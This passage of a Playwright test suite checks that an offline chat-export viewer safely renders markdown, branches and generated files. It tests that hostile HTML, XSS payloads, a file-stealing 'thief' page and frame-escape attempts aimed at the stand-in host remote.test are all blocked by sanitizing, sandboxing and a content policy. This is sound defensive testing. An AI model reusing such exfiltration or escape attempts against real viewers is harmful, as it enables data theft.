    await slow.page.waitForFunction(() => document.querySelectorAll('.msg').length === 4, null, { timeout: 5000 }).catch(() => {});
    const took = Date.now() - started;
    const slowInfo = await slow.page.evaluate(() => ({ text: document.querySelector('.msg[data-id="slow-1"] .prose').textContent, bold: !!document.querySelector('.msg[data-id="slow-3"] .prose strong') })).catch(() => ({ text: '', bold: false }));
    check('100 KB of emphasis marks renders in under 2 s', took < 2000, `${took} ms`);
    check('and says it is plain text', slowInfo.text.includes("This message was too complex to format, so it's shown as plain text.") && slowInfo.text.includes('*a *a'), slowInfo.text.slice(0, 200));
    check('the next message still formats', slowInfo.bold);

    // A branch near the end of a long chat keeps its place on screen.
    const bc = plainChat('branchy', 'Branchy', 40, '2026-04-01T00:00:00Z');
    bc.chat_messages.push({ ...clone(bc.chat_messages[39]), uuid: 'branchy-alt', created_at: '2026-02-01T11:59:00Z', content: [{ type: 'text', text: 'alternative ending' }] });
    const bfile = path.join(dir, 'branchy.html');
    fs.writeFileSync(bfile, buildHtml([bc], '2026-11-05T12:00:00Z'));
    const lost = await open({}, 'file://' + bfile + '#chat=branchy&leaf=nope');
    await lost.page.waitForSelector('.msg[data-id="branchy-39"]', { timeout: 3000 }).catch(() => {});
    const lostIds = await lost.page.$$eval('.msg', m => m.map(x => x.dataset.id));
    check('an unknown leaf falls back to the chat leaf', lostIds.includes('branchy-39') && !lostIds.includes('branchy-alt'), lostIds.slice(-2).join());
    check('and the hash names that leaf', (await lost.page.evaluate(() => location.hash)).includes('leaf=branchy-39'), await lost.page.evaluate(() => location.hash));
    const pos = await open({}, 'file://' + bfile + '#chat=branchy');
    await pos.page.waitForFunction(() => document.querySelectorAll('.msg').length === 40);
    const topOf = () => pos.page.evaluate(() => { const b = document.querySelector('.branch'); return b ? b.closest('.msg').getBoundingClientRect().top : null; });
    await pos.page.evaluate(() => { const s = document.getElementById('scroll'); s.scrollTop = s.scrollHeight; });
    await pos.page.waitForTimeout(100);
    const before = await topOf();
    await pos.page.click('.branch button[data-dir="1"]', { timeout: 1500 }).catch(() => {});
    await pos.page.waitForSelector('.msg[data-id="branchy-alt"]', { timeout: 2000 }).catch(() => {});
    await pos.page.waitForTimeout(400);
    const after = await topOf();
    check('a switched message keeps its screen position', before !== null && after !== null && Math.abs(after - before) <= 2, `${before} -> ${after}`);
    check('the alternative reply shows after a switch', (await pos.page.textContent('#chat')).includes('alternative ending'));

    const hostile = await open();
    await hostile.page.click('.item >> nth=4');
    await hostile.page.waitForSelector('.msg.assistant');
    await hostile.page.waitForFunction(n => document.querySelectorAll('.msg').length >= n, PIPELINE_PAYLOADS.length * 2, { timeout: 3000 }).catch(() => {});
    await hostile.page.waitForTimeout(500);
    const dom = await hostile.page.evaluate(() => {
      const box = document.getElementById('chat');
      return {
        hit: !!window.__hit, focused: !!document.activeElement.closest('.msg'), shown: box.querySelectorAll('.msg').length, bad: box.querySelectorAll('.prose script, .prose iframe, .prose svg:not(.ic), .prose style, .prose video, .prose audio').length,
        remote: [...box.querySelectorAll('.prose [src]')].filter(n => !n.src.startsWith('data:image/png')).length,
        js: box.querySelectorAll('a[href^="javascript" i]').length,
        clobbered: typeof document.getElementById !== 'function',
        styled: box.querySelectorAll('.prose [style]:not(.katex *)').length,
        bubble: box.querySelector('.bubble').textContent.includes('<script>'),
      };
    });
    check('hostile chat: nothing runs', !dom.hit, JSON.stringify(dom));
    check('hostile chat: no onfocus or autofocus takes the focus', !dom.focused, JSON.stringify(dom));
    check('hostile chat: every message shows', dom.shown === PIPELINE_PAYLOADS.length * 2, JSON.stringify(dom));
    const rawText = await hostile.page.$$eval('.msg.assistant .prose', p => p.map(x => x.textContent).join('\n'));
    check('hostile chat: raw HTML shows as text', rawText.includes('<frameset>') && rawText.includes(`<div x'y="$x$" <q=`), rawText.slice(-400));
    check('hostile chat: no dangerous element survives', dom.bad === 0, JSON.stringify(dom));
    check('hostile chat: nothing loads', dom.remote === 0, JSON.stringify(dom));
    check('hostile chat: no script links', dom.js === 0);
    check('hostile chat: no clobbering', !dom.clobbered);
    check('hostile chat: no inline styles', dom.styled === 0, JSON.stringify(dom));
    check('hostile chat: user text stays text', dom.bubble);
    check('hostile title stays text', (await hostile.page.textContent('#title')).startsWith('<img') && (await hostile.page.$$('#side img, #top img')).length === 0);

    await hostile.page.click('.item >> nth=3');
    await hostile.page.waitForFunction(() => document.querySelectorAll('.msg').length === 30, null, { timeout: 3000 }).catch(() => {});
    const proses = await hostile.page.$$eval('.msg.assistant', m => m.map(x => x.textContent.replace(/\s+/g, ' ')));
    Object.entries(TAG_WORDS).forEach(([name, text], i) => {
      const words = text.replace(/\n\n## /, ' ').replace(/\s+/g, ' ');
      check(`tag word shows literally: ${name}`, (proses[i] || '').includes(words), proses[i]);
    });
    check('a typed placeholder stays literal', (proses[4] || '').includes('Literal XMATHX0XEND and \u27E6T0M0\u27E7 with'), proses[4]);
    const marks = await hostile.page.evaluate(() => {
      const m = [...document.querySelectorAll('.msg.assistant')];
      const links = n => [...m[n].querySelectorAll('sup.cite a')].map(a => [a.textContent, a.getAttribute('href'), a.title]);
      return {
        typed: m[4].querySelectorAll('.katex').length, math: m[5].querySelectorAll('.katex').length, bold: m[5].querySelector('strong')?.textContent,
        cites: links(5), fenced: links(6).length, fence: m[6].querySelector('.code code')?.textContent,
        indented: m[6].querySelectorAll('.code code')[1]?.textContent, inline: m[6].querySelector('.prose :not(pre) > code')?.textContent,
        linkMath: m[6].querySelectorAll('.prose a .katex').length, linkTitle: m[6].querySelector('.prose a[title]')?.title,
        leftovers: document.getElementById('chat').textContent.includes('\u27E6T1'), auto: m[7].querySelector('a')?.getAttribute('href'),
      };
    });
    check('math renders beside a typed placeholder', marks.typed === 1, JSON.stringify(marks));
    check('math and citations render', marks.math === 1 && marks.cites.length === 2, JSON.stringify(marks));
    check('citation values stay intact', marks.cites[1] && marks.cites[1][1] === 'https://example.com/a?x="1"&y=<2>' && marks.cites[1][2] === '"><b>Title</b>', JSON.stringify(marks));
    check('a citation after bold leaves the bold working', marks.bold === 'Done.', JSON.stringify(marks));
    check('dollars in a fence stay literal', /^\$x\$ in a fence/.test(marks.fence || ''), JSON.stringify(marks));
    check('dollars in indented code stay literal', /^\$z\$ indented/.test(marks.indented || ''), JSON.stringify(marks));
    check('dollars in inline code stay literal', marks.inline === '$q$', JSON.stringify(marks));
    check('a citation inside code is dropped, not shown', marks.fenced === 0 && !marks.leftovers, JSON.stringify(marks));
    check('math in link text and titles', marks.linkMath === 1 && marks.linkTitle === '$t$', JSON.stringify(marks));
    check('angle-bracket links still work', marks.auto === 'https://example.com/auto', JSON.stringify(marks));

    const links = await hostile.page.evaluate(() => [...document.querySelectorAll('.msg.assistant')].slice(8).map(m => {
      const prose = m.querySelector('.prose');
      const a = prose.querySelector('a:not(sup a)');
      return {
        href: a && a.getAttribute('href'), link: a && a.textContent, text: prose.textContent.trim(), cites: prose.querySelectorAll('sup.cite').length,
        nested: prose.querySelectorAll('a sup, a a').length, math: prose.querySelectorAll('.katex').length,
      };
    }));
    LINK_CASES.forEach((c, i) => {
      const got = links[i] || {};
      const name = String(c.item.text || c.item).slice(0, 30);
      check(`link stays clean: ${name}`, got.href === c.href && got.link === c.link, JSON.stringify(got));
      check(`link text and citation in place: ${name}`, got.text === c.text && got.cites === c.cites && got.nested === 0 && got.math === 0, JSON.stringify(got));
    });
    const encoded = await hostile.page.$$eval('#chat *', els => els.flatMap(e => [...e.attributes]).filter(a => /%E2%9F%A[67]|\u27E6T\d/i.test(a.value)).map(a => a.value));
    check('no placeholder remains in any attribute', encoded.length === 0, encoded.join(' '));

    const broken = await hostile.page.evaluate(() => {
      const msg = (id, parent, blocks) => ({ id, parent, sender: 'assistant', at: '2026-01-01T00:00:00Z', blocks, uploads: [], attachments: [] });
      renderChat({ id: 'broken', title: 'Broken', messages: [msg('a', null, [{ t: 'text', text: 'first', cites: [] }]), msg('b', 'a', null), msg('c', 'b', [{ t: 'text', text: 'third', cites: [] }])], leaf: 'c' });
      return [...document.querySelectorAll('.msg')].map(m => m.textContent);
    });
    check('a failed message leaves the rest showing', broken.length === 3 && broken[0].includes('first') && broken[1].includes("This message couldn't be displayed") && broken[2].includes('third'), broken.join(' | '));

    const odd = await hostile.page.evaluate(() => ({
      names: sanitizeHtml('<div x\'y="1" a"b="2" data-ok="3" title="t">z</div>', new DOMParser()),
      comment: sanitizeHtml('a<!-- " x -->b', new DOMParser()),
      frames: sanitizeHtml('<frameset><frame></frameset>', new DOMParser()),
    }));
    check('sanitizeHtml drops odd attribute names', odd.names === '<div data-ok="3" title="t">z</div>', odd.names);
    check('sanitizeHtml drops comments', odd.comment === 'ab', odd.comment);
    check('sanitizeHtml survives a frameset', odd.frames === '', odd.frames);

    for (const payload of PAYLOADS) {
      const out = await hostile.page.evaluate(html => {
        const host = document.createElement('div');
        const safe = sanitizeHtml(html, new DOMParser());
        host.innerHTML = safe;
        document.body.append(host);
        const link = host.querySelector('a');
        if (link) link.click();
        return new Promise(done => setTimeout(() => {
          const res = { safe, hit: !!window.__hit, kids: host.querySelectorAll('script,iframe,svg,style').length, loads: [...host.querySelectorAll('[src],[href]')].length };
          host.remove();
          done(res);
        }, 120));
      }, payload);
      check(`sanitizeHtml disarms ${payload.slice(0, 34)}`, !out.hit && out.kids === 0 && out.loads === 0, JSON.stringify(out));
    }
    const kept = await hostile.page.evaluate(src => sanitizeHtml(`<img alt="x" src="${src}"><a href="https://a.test">y</a>`, new DOMParser()), PNG);
    check('sanitizeHtml keeps data images and web links', kept.includes('src="data:image/png') && kept.includes('href="https://a.test"') && kept.includes('rel="noopener"'), kept);
    const svgData = await hostile.page.evaluate(() => sanitizeHtml('<img src="data:image/svg+xml;base64,PHN2Zz4=">', new DOMParser()));
    check('sanitizeHtml drops SVG data images', !svgData.includes('<img'), svgData);
    clean('hostile flow', hostile.seen);

    // autofocus only fires on a page's first chat, before anything has been clicked.
    for (const [i, payload] of PIPELINE_PAYLOADS.filter(t => t.includes('autofocus')).entries()) {
      const one = path.join(dir, `focus${i}.html`);
      fs.writeFileSync(one, buildHtml([turnsChat('one', 'One', [payload], '2026-01-01T00:00:00Z')], '2026-11-05T12:00:00Z'));
      const s = await open({}, 'file://' + one);
      await s.page.waitForTimeout(400);
      const state = await s.page.evaluate(() => ({ hit: !!window.__hit, focused: document.activeElement.tagName }));
      check(`no onfocus fires on open: ${payload.slice(0, 12)}`, !state.hit && state.focused === 'BODY', JSON.stringify(state));
      clean(`autofocus payload ${i}`, s.seen);
    }

    const phone = await open({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
    check('phone: no sideways scroll', await phone.page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
    check('phone: sidebar starts hidden', await phone.page.$eval('#side', s => s.getBoundingClientRect().right <= 0));
    await phone.page.click('#menu');
    await phone.page.waitForFunction(() => document.getElementById('side').getBoundingClientRect().left >= 0);
    await phone.page.click('.item:has-text("Short chat")');
    check('phone: picking a chat closes the drawer', (await phone.page.textContent('#title')) === 'Short chat' && !(await phone.page.evaluate(() => document.body.classList.contains('drawer'))));

    // The side panel.
    const made = panelChat();
    const pfile = path.join(dir, 'panel.html');
    fs.mkdirSync(path.join(dir, 'artefacts'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'artefacts', 'photo.png'), Buffer.from(PNG.split(',')[1], 'base64'));
    fs.writeFileSync(path.join(dir, 'artefacts', 'paper.pdf'), MINIMAL_PDF);
    fs.writeFileSync(path.join(dir, 'artefacts', 'fake.pdf'), ESCAPE_HTML);
    fs.writeFileSync(path.join(dir, 'artefacts', 'bundle.zip'), 'PK');
    fs.writeFileSync(path.join(dir, 'artefacts', 'escape.html'), ESCAPE_HTML);
    fs.writeFileSync(pfile, buildHtml([made.conversation, plainChat('other', 'Other chat', 2, '2026-01-01T00:00:00Z')], '2026-11-05T12:00:00Z', c => (c.uuid === 'files' ? made.ctx : {})));
    const purl = 'file://' + pfile;
    const card = name => `.art:has(b:text-is(${JSON.stringify(name)}))`;
    const openFile = async (p, name, nth = 0) => {
      await p.page.waitForSelector(card(name), { state: 'attached' });
      await p.page.locator(card(name)).nth(nth).click();
      await p.page.waitForSelector('#panel:not([hidden])');
    };
    const frameIn = async p => (await p.page.waitForSelector('#panel iframe', { state: 'attached' })).contentFrame();
    const waitLog = async (p, text) => {
      for (let i = 0; i < 60 && !p.seen.logs.some(l => l.includes(text)); i++) await p.page.waitForTimeout(50);
      return p.seen.logs.some(l => l.includes(text));
    };
    const tabs = p => p.page.$$eval('#panel .tab', b => b.map(x => x.textContent));
    const versions = p => p.page.$$eval('#panel .ver', b => b.map(x => x.textContent));
    const note = p => p.page.$eval('#panel .file-note', n => n.textContent).catch(() => null);
    const atHash = p => p.page.evaluate(() => location.hash);

    // The counter has to be able to see what it is meant to catch.
    const control = await open();
    const ctrlPage = await control.context.newPage();
    const ctrlSeen = [];
    await ctrlPage.route('**/*', r => { ctrlSeen.push(r.request().url()); return r.abort(); });
    await ctrlPage.setContent('<iframe srcdoc="<img src=https://remote.test/control.png>"></iframe>');
    await ctrlPage.waitForTimeout(300);
    check('control: a frame request with no policy is counted', ctrlSeen.includes('https://remote.test/control.png'), ctrlSeen.join());
    // And the page the attacks aim for has to give itself away when it does load.
    const ctrlEscape = await control.context.newPage();
    const ctrlLogs = [];
    ctrlEscape.on('console', m => ctrlLogs.push(m.text()));
    await ctrlEscape.goto('file://' + path.join(dir, 'artefacts', 'escape.html'));
    await ctrlEscape.waitForTimeout(150);
    check('control: the escape page reports when it runs', ctrlLogs.includes('ESCAPED'), ctrlLogs.join());

    const main = await open({}, purl);
    const wide = await main.page.$eval('#panel', n => n.hidden);
    check('no panel until a file is opened', wide);
    const cardText = await main.page.$eval(card('report.html'), n => n.textContent);
    check('a card shows its name and kind', cardText.includes('report.html') && cardText.includes('Document · HTML'), cardText);
    check('a card with versions names its own', cardText.includes('v1'), cardText);
    const scrolled = await main.page.evaluate(() => { const s = document.getElementById('scroll'); s.scrollTop = 200; document.querySelector('.msg').dataset.mark = 'kept'; return s.scrollTop; });
    await main.page.evaluate(() => document.querySelector('.art').click());
    await main.page.waitForSelector('#panel:not([hidden])');
    check('a card opens the panel with its title', (await main.page.textContent('#panel .panel-title')) === 'report.html');
    check('the panel names the kind', (await main.page.textContent('#panel .panel-kind')) === 'Document · HTML');
    check('Preview and Code are offered', (await tabs(main)).join() === 'Preview,Code');
    check('versions show when there are several', (await versions(main)).join() === 'v1,v2,v3', (await versions(main)).join());
    check('the panel takes about 43% of a wide window', await main.page.$eval('#panel', n => Math.abs(n.getBoundingClientRect().width / innerWidth - 0.43) < 0.01));
    check('the card version opens', /file=a1&version=0/.test(await atHash(main)), await atHash(main));
    check('the open card is marked', await main.page.$$eval('.art', a => a.filter(x => x.classList.contains('on')).length === 1 && a[0].classList.contains('on')));
    check('opening a file keeps the chat where it was', await main.page.evaluate(top => document.querySelector('.msg').dataset.mark === 'kept' && document.getElementById('scroll').scrollTop === top, scrolled));
    const attrs = await main.page.$eval('#panel iframe', f => [...f.attributes].map(a => a.name).sort().join());
    check('the frame has sandbox and srcdoc, and nothing that loosens them', attrs === 'class,sandbox,srcdoc,title', attrs);
    check('sandbox is allow-scripts and nothing else', (await main.page.$eval('#panel iframe', f => f.getAttribute('sandbox'))) === 'allow-scripts');
    const frame = await frameIn(main);
    await frame.waitForSelector('#ver');
    check('frame-src permits the srcdoc frame, and it runs', await waitLog(main, 'PREVIEW report 1'), main.seen.errors.join(' | '));
    check('the file shows in the frame', (await frame.textContent('#ver')) === 'report version 1');
    check('the card version is the one showing', !(main.seen.logs.some(l => l.includes('PREVIEW report 3'))));
    check('the policy is the first thing in the frame', (await main.page.$eval('#panel iframe', f => f.srcdoc)).startsWith('<!doctype html><meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '));
    await main.page.click('#panel .ver:has-text("v2")');
    check('a version button changes the file', await waitLog(main, 'PREVIEW report 2'));
    check('a version button keeps the chat', await main.page.evaluate(top => document.querySelector('.msg').dataset.mark === 'kept' && document.getElementById('scroll').scrollTop === top, scrolled));
    check('the open version is marked', (await main.page.textContent('#panel .ver.on')) === 'v2');
    check('the hash follows the version', /file=a1&version=1/.test(await atHash(main)), await atHash(main));
    check('the mark follows the version', await main.page.$$eval('.art', a => a.findIndex(x => x.classList.contains('on')) === 1));
    await main.page.reload();
    await main.page.waitForSelector('#panel iframe');
    check('reload restores the file and version', (await (await frameIn(main)).textContent('#ver')) === 'report version 2');
    check('reload restores the marked version', (await main.page.textContent('#panel .ver.on')) === 'v2');
    check('reload marks the card', await main.page.waitForFunction(() => document.querySelectorAll('.art.on').length === 1, null, { timeout: 2000 }).then(() => true, () => false));
    await main.page.click('#panel .tab:has-text("Code")');
    const code = await main.page.$eval('#panel pre', n => ({ text: n.textContent, kids: n.childElementCount }));
    check('Code shows the source as text', code.text === report(2) && code.kids === 0, JSON.stringify(code));
    check('Code drops the frame', (await main.page.$$('#panel iframe')).length === 0);
    await main.page.click('#panel .ver:has-text("v3")');
    check('a version button stays in Code view', (await main.page.textContent('#panel pre')) === report(3));
    await main.page.click('#panel .tab:has-text("Preview")');
    check('Preview comes back', await waitLog(main, 'PREVIEW report 3'));
    await main.page.click('#panel .close');
    check('close hides the panel', await main.page.$eval('#panel', n => n.hidden));
    check('close clears the file from the hash', !/file=/.test(await atHash(main)), await atHash(main));
    check('close unmarks the card', (await main.page.$$('.art.on')).length === 0);
    check('close leaves no frame behind', (await main.page.$$('iframe')).length === 0);
    await openFile(main, 'single.html');
    check('a single version has no version buttons', (await versions(main)).length === 0);
    await openFile(main, 'report.html', 2);
    await main.page.goBack();
    await main.page.waitForFunction(() => document.querySelector('#panel .panel-title')?.textContent === 'single.html', null, { timeout: 2000 }).catch(() => {});
    check('Back goes to the file before', (await main.page.textContent('#panel .panel-title')) === 'single.html');
    await main.page.click('.item:has-text("Other chat")');
    check('another chat closes the panel', await main.page.$eval('#panel', n => n.hidden));
    clean('panel flow', main.seen);

    const fbad = await open({}, purl + '#chat=files&file=__proto__&version=1');
    check('a prototype name is not a file', await fbad.page.$eval('#panel', n => n.hidden));
    check('an unknown file leaves the hash', !/file=|version=/.test(await atHash(fbad)), await atHash(fbad));
    await fbad.page.evaluate(() => { location.hash = '#chat=files&file=constructor'; });
    await fbad.page.waitForTimeout(100);
    check('a built-in name is not a file', await fbad.page.$eval('#panel', n => n.hidden));
    const far = await open({}, purl + '#chat=files&file=a1&version=99');
    await far.page.waitForSelector('#panel iframe');
    check('a version out of range shows the latest', (await far.page.textContent('#panel .ver.on')) === 'v3');
    const swapped = await open({}, purl + '#chat=no-such-chat&leaf=files-1&file=a1&version=0');
    check('an unknown chat drops leaf, file and version', await swapped.page.evaluate(() => !/leaf=files-1(&|$)|file=|version=/.test(location.hash) && document.getElementById('panel').hidden), await atHash(swapped));
    check('an unknown chat still shows the newest', (await swapped.page.textContent('#title')) === 'Generated files');

    const sib = await open({}, purl);
    await openFile(sib, 'uses-sibling.html');
    const sf = await frameIn(sib);
    check('a sibling script runs', await waitLog(sib, 'SIBLING ran $&'), sib.seen.logs.join(' | '));
    check('a closing tag in a sibling stays in it', await waitLog(sib, 'SIBLING after </script>'), sib.seen.logs.join(' | '));
    check('a sibling script reaches the page', (await sf.textContent('#s')) === 'changed by sibling');
    check('a sibling stylesheet applies', (await sf.$eval('#s', n => getComputedStyle(n).color)) === 'rgb(1, 2, 3)');
    check('no note without a remote script', (await note(sib)) === null);
    clean('sibling flow', sib.seen);

    const dfr = await open({}, purl);
    await openFile(dfr, 'defer.html');
    const df = await frameIn(dfr);
    check('a deferred sibling runs once the body exists', await waitLog(dfr, 'DEFER ran true'), dfr.seen.logs.join(' | '));
    check('a deferred sibling reaches the page', (await df.textContent('#d')) === 'changed by defer');
    clean('defer flow', dfr.seen);

    const ev = await open({}, purl);
    await openFile(ev, 'eval.html');
    await frameIn(ev);
    check('a preview may use new Function', await waitLog(ev, 'EVAL gave 7'), ev.seen.logs.join(' | '));
    check('eval is not blocked by the page policy', !ev.seen.errors.some(e => /unsafe-eval/.test(e)), ev.seen.errors.join(' | '));

    const thief = await open({}, purl);
    await openFile(thief, 'thief.html');
    await frameIn(thief);
    check('thief: the script ran', await waitLog(thief, 'THIEF ran'), thief.seen.logs.join(' | '));
    check('thief: a real stylesheet still arrives', thief.seen.logs.includes('THIEF css true'), thief.seen.logs.join(' | '));
    check('thief: a text file is not inlined as a stylesheet', thief.seen.logs.includes('THIEF notes false'), thief.seen.logs.join(' | '));
    check('thief: an HTML file is not inlined as a script', thief.seen.logs.includes('THIEF other false'), thief.seen.logs.join(' | '));
    const stolen = await thief.page.$eval('#panel iframe', f => f.getAttribute('srcdoc'));
    check('thief: neither file is in the frame', !stolen.includes('SECRET-NOTES') && !stolen.includes('SECRET-OTHER'));

    const rem = await open({}, purl);
    await openFile(rem, 'remote-lib.html');
    await frameIn(rem);
    check('the page after a remote script still runs', await waitLog(rem, 'REMOTE page ran'));
    check('a remote script is explained', (await note(rem)) === 'This file loads a script from the internet, which the viewer blocks, so it may not work here. Code view shows the full source.', await note(rem));
    check('a remote script offers Code view', (await tabs(rem)).join() === 'Preview,Code');
    check('a remote script is never requested', rem.seen.requests.length === 0, rem.seen.requests.join());

    const kinds = await open({}, purl);
    await openFile(kinds, 'tool.py');
    check('.py has Code view and no Preview', (await tabs(kinds)).join() === 'Code', (await tabs(kinds)).join());
    check('.py shows its source', (await kinds.page.textContent('#panel pre')).startsWith('print("<b>hi</b>")'));
    for (const name of ['Chart.jsx', 'flow.mmd']) {
      await openFile(kinds, name);
      check(`${name} opens in Code view`, (await tabs(kinds)).join() === 'Code' && (await kinds.page.$$('#panel pre')).length === 1);
      check(`${name} can't preview offline`, (await note(kinds)) === "This file type can't preview offline. Code view shows the full source.", await note(kinds));
    }
    await openFile(kinds, 'notes.md');
    check('md renders as chat text does', (await kinds.page.$$('#panel .prose h2')).length === 1 && (await kinds.page.$$('#panel .prose .katex')).length === 1 && (await kinds.page.$$('#panel .prose .code')).length === 1);
    check('md is sanitized', !(await kinds.page.evaluate(() => !!window.__hit)) && (await kinds.page.$$('#panel iframe, #panel script')).length === 0);
    await kinds.page.click('#panel .copy');
    await kinds.page.waitForFunction(() => document.querySelector('#panel .copy span').textContent === 'Copied');
    check('md code blocks copy', true);
    await openFile(kinds, 'drawing.svg');
    check('an SVG runs in the sandbox', await waitLog(kinds, 'SVG ran'));
    check('an SVG frame is sandboxed', (await kinds.page.$eval('#panel iframe', f => f.getAttribute('sandbox'))) === 'allow-scripts');
    await openFile(kinds, 'photo.png');
    await kinds.page.waitForFunction(() => document.querySelector('#panel img')?.naturalWidth > 0, null, { timeout: 2000 }).catch(() => {});
    check('an image shows from its link', await kinds.page.$eval('#panel img', i => i.naturalWidth > 0).catch(() => false));
    check('an image has no Code view', (await tabs(kinds)).join() === 'Preview', (await tabs(kinds)).join());
    await openFile(kinds, 'paper.pdf');
    const pdf = await kinds.page.$eval('#panel iframe', f => ({ sandboxed: f.hasAttribute('sandbox'), src: f.getAttribute('src'), srcdoc: f.hasAttribute('srcdoc') }));
    check('a PDF uses a plain frame', !pdf.sandboxed && !pdf.srcdoc && pdf.src === 'artefacts/paper.pdf', JSON.stringify(pdf));
    await kinds.page.waitForTimeout(400);
    check('frame-src permits the PDF frame', kinds.seen.files.some(u => u.endsWith('/artefacts/paper.pdf')) && !kinds.seen.errors.some(e => /frame|Content Security Policy/i.test(e)), kinds.seen.errors.join(' | '));
    await openFile(kinds, 'fake.pdf');
    await kinds.page.waitForTimeout(500);
    check('a page named .pdf does not run', !kinds.seen.logs.some(l => l.includes('ESCAPED')), kinds.seen.logs.join(' | '));
    await openFile(kinds, 'bundle.zip');
    const zip = await kinds.page.$eval('#panel a', a => ({ href: a.getAttribute('href'), target: a.target, rel: a.rel })).catch(() => null);
    check('a binary offers an open link', zip && zip.href === 'artefacts/bundle.zip' && zip.target === '_blank' && zip.rel === 'noopener', JSON.stringify(zip));
    check('a binary has no tabs', (await tabs(kinds)).length === 0);
    await openFile(kinds, 'opaque.html');
    check('an HTML file with no text gets no link', (await kinds.page.$$('#panel a, #panel iframe')).length === 0 && (await kinds.page.textContent('#panel-body')).includes("can't open"), await kinds.page.textContent('#panel-body'));
    await openFile(kinds, 'gone.png');
    check('a missing file says so', (await kinds.page.textContent('#panel-body')) === 'This file is not in this export.', await kinds.page.textContent('#panel-body'));
    check('a missing file has no tabs or link', (await tabs(kinds)).length === 0 && (await kinds.page.$$('#panel a, #panel img')).length === 0);
    check('a card says when a file is missing', (await kinds.page.textContent(card('gone.png'))).includes('Not in this export'));
    await openFile(kinds, BAD_NAME);
    check('a hostile file name stays text', (await kinds.page.textContent('#panel .panel-title')) === BAD_NAME && !(await kinds.page.evaluate(() => !!window.__hit)) && (await kinds.page.$$('#panel-head img, .art img')).length === 0);
    check('no panel link ever points at a page', await kinds.page.$$eval('#panel a', a => a.every(x => !/\.(html?|svg|xhtml)$/i.test(x.getAttribute('href')))));
    check('kinds flow makes no requests', kinds.seen.requests.length === 0, kinds.seen.requests.join());

    // Hostile artifact: every attempt reports what happened to it from inside the frame.
    const atk = await open({}, purl);
    let popups = 0;
    atk.context.on('page', () => { popups++; });
    await openFile(atk, 'hostile.html');
    const af = await frameIn(atk);
    await af.waitForSelector('h1');
    check('hostile: the script ran to the end', await waitLog(atk, 'ATTACK finished yes'), atk.seen.logs.filter(l => l.startsWith('ATTACK')).join(' | '));
    check('hostile: the frame has no origin', atk.seen.logs.includes('ATTACK origin null'), atk.seen.logs.slice(0, 5).join(' | '));
    for (const [name, end] of Object.entries(ATTACK_ENDS)) {
      const said = atk.seen.logs.filter(l => l.startsWith(`ATTACK ${name} `)).map(l => l.slice(`ATTACK ${name} `.length));
      check(`hostile: ${name} was attempted`, said[0] === 'ran', said.join());
      check(`hostile: ${name} failed`, said[1] === end, said.join());
    }
    const violations = atk.seen.logs.filter(l => l.startsWith('VIOLATION'));
    for (const url of ['https://remote.test/fetch', 'https://remote.test/beacon', 'wss://remote.test/ws', 'https://remote.test/img.png', 'https://remote.test/tag.png', 'https://remote.test/f.woff', 'https://remote.test/bg.png', 'https://remote.test/s.css']) {
      check(`hostile: the policy stopped ${url}`, violations.some(v => v.endsWith(' ' + url)), violations.join(' | '));
    }
    check('hostile: a nested frame ran, and is held to the same policy', await waitLog(atk, 'NESTED ran') && await waitLog(atk, "Refused to connect to 'https://remote.test/nested'"), atk.seen.logs.filter(l => /nested/i.test(l)).join(' | '));
    await atk.page.waitForTimeout(400);
    check('hostile: no request left the page', atk.seen.requests.length === 0, atk.seen.requests.join());
    check('hostile: no window opened', popups === 0, String(popups));
    check('hostile: the viewer stays on its page', atk.page.url().startsWith(purl), atk.page.url());
    check('hostile: the viewer title is untouched', (await atk.page.title()) === 'Generated files - Claude Takeout', await atk.page.title());
    check('hostile: nothing ran in the viewer', !(await atk.page.evaluate(() => !!window.__hit)));

    for (const name of ['nav-https.html', 'nav-relative.html', 'nav-file.html', 'nav-data.html', 'nav-blob.html', 'nav-refresh.html', 'nav-form.html', 'nav-top-link.html']) {
      const nav = await open({}, purl);
      let opened = 0;
      nav.context.on('page', () => { opened++; });
      await openFile(nav, name);
      await frameIn(nav);
      const ran = await waitLog(nav, `NAV ran ${name}`);
      await nav.page.waitForTimeout(500);
      check(`${name}: the attempt ran`, ran, nav.seen.logs.join(' | '));
      check(`${name}: nothing got out`, !nav.seen.logs.some(l => l.includes('ESCAPED')) && nav.seen.requests.length === 0 && opened === 0, [...nav.seen.logs, ...nav.seen.requests].join(' | '));
      check(`${name}: the viewer stays`, nav.page.url().startsWith(purl) && (await nav.page.title()) === 'Generated files - Claude Takeout', nav.page.url());
      await nav.context.close();
    }

    const mid = await open({ viewport: { width: 900, height: 700 } }, purl);
    await openFile(mid, 'report.html');
    const midBox = await mid.page.evaluate(() => { const p = document.getElementById('panel').getBoundingClientRect(), m = document.getElementById('main').getBoundingClientRect(); return { covers: p.left <= m.left && p.right >= m.right, top: p.top, sideShown: document.getElementById('side').getBoundingClientRect().right === p.left }; });
    check('narrow: the panel covers the chat', midBox.covers && midBox.top === 0 && midBox.sideShown, JSON.stringify(midBox));
    const tiny = await open({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true }, purl);
    await tiny.page.waitForSelector(card('report.html'));
    await tiny.page.locator(card('report.html')).first().tap();
    await tiny.page.waitForSelector('#panel:not([hidden])');
    check('phone: the panel fills the screen', await tiny.page.$eval('#panel', n => { const r = n.getBoundingClientRect(); return r.left === 0 && r.right === innerWidth; }));
    check('phone: no sideways scroll with the panel', await tiny.page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
    await tiny.page.tap('#panel .close');
    check('phone: close returns to the chat', await tiny.page.$eval('#panel', n => n.hidden));


    // Popups for uploads, attachments and project files.
    const ups = uploadsChat();
    fs.mkdirSync(path.join(dir, 'uploads'), { recursive: true });
    fs.mkdirSync(path.join(dir, 'project', 'files'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'uploads', 'p01_photo.png'), Buffer.from(PNG.split(',')[1], 'base64'));
    fs.writeFileSync(path.join(dir, 'uploads', 'p01_page.html'), UPLOAD_HTML);
    fs.writeFileSync(path.join(dir, 'uploads', 'p01_paper.pdf'), MINIMAL_PDF);
    fs.writeFileSync(path.join(dir, 'uploads', 'p01_minutes.odt'), 'PK');
    fs.writeFileSync(path.join(dir, 'project', 'files', 'spec.pdf'), MINIMAL_PDF);
    fs.writeFileSync(path.join(dir, 'project', 'files', 'data.zip'), 'PK');
    const ufile = path.join(dir, 'popups.html');
